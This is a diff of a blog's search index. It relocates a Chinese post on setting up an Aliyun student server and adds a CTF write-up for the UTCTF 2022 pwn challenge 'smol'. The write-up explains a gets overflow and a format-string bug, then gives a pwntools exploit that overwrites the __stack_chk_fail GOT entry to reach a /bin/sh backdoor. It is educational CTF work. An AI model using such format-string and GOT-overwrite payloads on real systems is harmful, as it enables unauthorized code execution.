@@ -1060,40 +1060,6 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
-    <title>记一次阿里云学生服务器白嫖</title>
-    <url>/2019/09/03/blogarchive/2019-09-03-20-51-24/</url>
-    <content><![CDATA[<h3 id="购买服务器-白嫖"><a href="#购买服务器-白嫖" class="headerlink" title="购买服务器 (白嫖)"></a>购买服务器 (白嫖)</h3><hr>
-<p>首先，打开白嫖连接: <a href="https://promotion.aliyun.com/ntms/act/campus2018.html">https://promotion.aliyun.com/ntms/act/campus2018.html</a></p>
-<p>购买一个服务器，云服务器EMC和轻量应用服务器都行，购买完成后进入管理界面</p>
-<span id="more"></span>
-
-<p><img src="https://i.loli.net/2019/09/03/hgd3LOTRyqDWluN.png" alt="1.png"></p>
-<h3 id="设置ssh连接"><a href="#设置ssh连接" class="headerlink" title="设置ssh连接"></a>设置ssh连接</h3><hr>
-<ol>
-<li>进入服务器运维-远程连接。</li>
-<li>设置密码, 设置一个服务器密码。<br><img src="https://i.loli.net/2019/09/03/guaXENAjPkxsGVm.png" alt="D223E1E8-AD8E-46DB-B505-9AEFC7274AD1.png"></li>
-<li>检查服务器是否允许用密码登陆ssh</li>
-<li>点击 使用浏览器发起安全连接（推荐）<br><img src="https://i.loli.net/2019/09/03/nQyRkcB1WMrKfp4.png" alt="9153CC24-DE77-45B8-B92F-A66FFB5DF064.png"></li>
-<li><code>sudo nano /etc/ssh/sshd_config</code> 进入配置文件</li>
-<li>改 <code>/etc/ssh/sshd_config </code> 文件中的<code>PasswordAuthentication no</code>改为<code>PasswordAuthentication yes</code>并保存<br><img src="https://i.loli.net/2019/09/03/o1gSpWdxmbchkDt.png" alt="4BF7B8D5-70D6-4133-ABD9-AD605A684456.png"></li>
-<li>重启sshd服务<code>sudo systemctl restart sshd.service</code></li>
-</ol>
-<h3 id="测试ssh连接"><a href="#测试ssh连接" class="headerlink" title="测试ssh连接"></a>测试ssh连接</h3><hr>
-<ol>
-<li>在 服务器运维-远程连接 中找到连接ip<br><img src="https://i.loli.net/2019/09/03/d9uIcLsJxmNHDF8.png" alt="E4930553-853D-4403-9529-EAB84D8FA7F0.png"></li>
-<li>客户端中测试连接<br><img src="https://i.loli.net/2019/09/03/TnYGO9QFCdulEBr.png" alt="22F9B590-D826-4DE0-BBEA-3FDE18566A5B.png"></li>
-<li>完成<del>撒花</del>ε==(づ′▽`)づ<br><img src="https://i.loli.net/2019/09/03/QEhJtPYWDSMwcuk.png" alt="12331145-394B-48BB-9588-32AEE510BB73.png"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>aliyun</tag>
-        <tag>白嫖</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Aria2 在 Macos上的安装</title>
     <url>/2019/09/03/blogarchive/2019-09-03-20-59-14/</url>
     <content><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><hr>
@@ -1169,6 +1135,40 @@ file-allocation=prealloc
       <tags>
         <tag>macos</tag>
         <tag>aria2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次阿里云学生服务器白嫖</title>
+    <url>/2019/09/03/blogarchive/2019-09-03-20-51-24/</url>
+    <content><![CDATA[<h3 id="购买服务器-白嫖"><a href="#购买服务器-白嫖" class="headerlink" title="购买服务器 (白嫖)"></a>购买服务器 (白嫖)</h3><hr>
+<p>首先，打开白嫖连接: <a href="https://promotion.aliyun.com/ntms/act/campus2018.html">https://promotion.aliyun.com/ntms/act/campus2018.html</a></p>
+<p>购买一个服务器，云服务器EMC和轻量应用服务器都行，购买完成后进入管理界面</p>
+<span id="more"></span>
+
+<p><img src="https://i.loli.net/2019/09/03/hgd3LOTRyqDWluN.png" alt="1.png"></p>
+<h3 id="设置ssh连接"><a href="#设置ssh连接" class="headerlink" title="设置ssh连接"></a>设置ssh连接</h3><hr>
+<ol>
+<li>进入服务器运维-远程连接。</li>
+<li>设置密码, 设置一个服务器密码。<br><img src="https://i.loli.net/2019/09/03/guaXENAjPkxsGVm.png" alt="D223E1E8-AD8E-46DB-B505-9AEFC7274AD1.png"></li>
+<li>检查服务器是否允许用密码登陆ssh</li>
+<li>点击 使用浏览器发起安全连接（推荐）<br><img src="https://i.loli.net/2019/09/03/nQyRkcB1WMrKfp4.png" alt="9153CC24-DE77-45B8-B92F-A66FFB5DF064.png"></li>
+<li><code>sudo nano /etc/ssh/sshd_config</code> 进入配置文件</li>
+<li>改 <code>/etc/ssh/sshd_config </code> 文件中的<code>PasswordAuthentication no</code>改为<code>PasswordAuthentication yes</code>并保存<br><img src="https://i.loli.net/2019/09/03/o1gSpWdxmbchkDt.png" alt="4BF7B8D5-70D6-4133-ABD9-AD605A684456.png"></li>
+<li>重启sshd服务<code>sudo systemctl restart sshd.service</code></li>
+</ol>
+<h3 id="测试ssh连接"><a href="#测试ssh连接" class="headerlink" title="测试ssh连接"></a>测试ssh连接</h3><hr>
+<ol>
+<li>在 服务器运维-远程连接 中找到连接ip<br><img src="https://i.loli.net/2019/09/03/d9uIcLsJxmNHDF8.png" alt="E4930553-853D-4403-9529-EAB84D8FA7F0.png"></li>
+<li>客户端中测试连接<br><img src="https://i.loli.net/2019/09/03/TnYGO9QFCdulEBr.png" alt="22F9B590-D826-4DE0-BBEA-3FDE18566A5B.png"></li>
+<li>完成<del>撒花</del>ε==(づ′▽`)づ<br><img src="https://i.loli.net/2019/09/03/QEhJtPYWDSMwcuk.png" alt="12331145-394B-48BB-9588-32AEE510BB73.png"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>aliyun</tag>
+        <tag>白嫖</tag>
       </tags>
   </entry>
   <entry>
@@ -3069,6 +3069,34 @@ https://www.bsfdvbsbilibili.com
         <tag>ctf</tag>
         <tag>writeup</tag>
         <tag>protocal analysis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[pwn] smol [utctf 2022]</title>
+    <url>/2022/03/14/ctfwriteup/utctf2022/utctf2022-pwn-smol/</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In this challenge, a binary <code>smol</code> is provided. </p>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h1 id="0x2-Identify-the-problem"><a href="#0x2-Identify-the-problem" class="headerlink" title="0x2 Identify the problem"></a>0x2 Identify the problem</h1><p>here is a simplified version of what is main function doing. </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main(void)</span><br><span class="line">&#123;</span><br><span class="line">    var char *s1 @ rbp-0x150</span><br><span class="line">    var char *format @ rbp-0xe0</span><br><span class="line">    var char *s @ rbp-0x70</span><br><span class="line">    var int64_t canary @ rbp-0x8</span><br><span class="line"></span><br><span class="line">    canary = *(in_FS_OFFSET + 0x28);</span><br><span class="line">    sym.imp.puts(&quot;What kind of data do you have?&quot;);</span><br><span class="line">    sym.imp.gets(&amp;s1);</span><br><span class="line">    iVar2 = sym.imp.strcmp(&amp;s1, &quot;big data&quot;);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">        // set variable format to some certain format</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // set format to some certain format</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.puts(&quot;Give me your data&quot;);</span><br><span class="line">    sym.imp.gets(&amp;s);</span><br><span class="line">    sym.imp.printf(&amp;format, &amp;s);</span><br><span class="line">    sym.imp.putchar(10);</span><br><span class="line">    if (canary != *(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Take a brief looking at the code, we can identify two trivial vulnerability here. One is <code>gets</code>, which allow us to write arbitrary number of bytes to the stack. Another is <code>printf</code>, printf allow us to read/write data at specific address.</p>
+<p>Since <code>format</code> is locate under variable <code>s1</code>, we can overwrite <code>format</code> with any format we want using <code>gets(&amp;s1)</code>. This allow us to do a arbitrary read/write with <code>printf</code>. </p>
+<p>My first idea is try to leak the data in the canary and then do a rop chain to get a shell. However, <code>printf</code> execute after last <code>gets</code> function. Even we get the canary, we can’t overwrite canary because there is no stack overflow bug after that.</p>
+<p>Lets take look at mitigation again, the mitigation shows that this program is partial RELRO. This allows us to modify the function address in the global offset table. So it is a good idea using <code>printf</code> to overwrite <code>__stack_chk_fail</code>‘s address to a code address in global offset table. Then, we overwrite canary to trigger <code>__stack_chk_fail</code> and call the code we want.</p>
+<p>Luckily, the binary kindly give us a backdoor at <code>get_flag()</code>. So, write address of <code>__stack_chk_fail</code> at GOT to <code>get_flag()</code> will give us a shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void sym.get_flag(void)&#123;</span><br><span class="line">// some code</span><br><span class="line">    sym.imp.execve(&quot;/bin/sh&quot;, &amp;var_20h, 0);</span><br><span class="line">// some code</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Exploits"><a href="#0x3-Exploits" class="headerlink" title="0x3 Exploits"></a>0x3 Exploits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = connect(&quot;pwn.utctf.live&quot;, 5004)</span><br><span class="line"></span><br><span class="line">print(&quot;got __stack_chk_fail,&quot;,hex(exe.got[&quot;__stack_chk_fail&quot;]))</span><br><span class="line">payload1 = flat(&#123;</span><br><span class="line">    0x0:exe.got[&quot;__stack_chk_fail&quot;],</span><br><span class="line">    0x150 - 0xe0: b&#x27;%%%dx%%6$hn\x00&#x27; % 0x1349</span><br><span class="line">&#125;,filler=b&quot;A&quot;)</span><br><span class="line">io.sendlineafter(b&quot;do you have?\n&quot;,payload1)</span><br><span class="line"># trigger stack chk fail</span><br><span class="line">io.sendlineafter(b&quot;Give me your data\n&quot;,b&quot;A&quot;*0x70)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
       </tags>
   </entry>
 </search>
